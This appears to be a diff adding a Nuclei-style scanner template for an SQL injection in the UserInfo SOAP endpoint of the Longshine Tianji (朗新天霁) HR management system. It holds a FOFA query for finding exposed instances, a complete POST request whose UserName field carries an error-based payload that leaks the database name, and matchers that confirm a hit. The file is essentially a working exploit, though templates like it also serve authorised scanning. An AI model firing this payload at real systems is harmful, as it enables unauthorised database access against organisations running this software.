@@ -1,0 +1,42 @@
+id: longshine-tianji-hr-userinfo-sqli
+
+info:
+  name: 朗新天霁人力资源管理系统 UserInfo接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="divRememberPwd"
+      该系统在UserInfo接口处理逻辑中存在SQL注入缺陷，攻击者可通过构造恶意输入参数实现数据库敏感信息获取。漏洞检测特征基于页面包含divRememberPwd标识元素，披露日期为2025-11-24。
+  tags: 朗新天霁人力资源管理系统
+
+http:
+  - raw:
+      - |
+        POST /ws/ZFMCWs/ZFMCWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8" ?>
+        <soap:Envelope
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+          xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+        >
+        <soap:Body>
+          <UserInfo xmlns="http://tempuri.org/">
+          <UserName>') OR 1=CONVERT(int, DB_NAME()) -- </UserName>
+          <DeptName>rt</DeptName>
+          </UserInfo>
+        </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '数据出错'
+          - 'System.Data.SqlClient.SqlException'
+        condition: and
+      - type: status
+        status: 
+          - 200
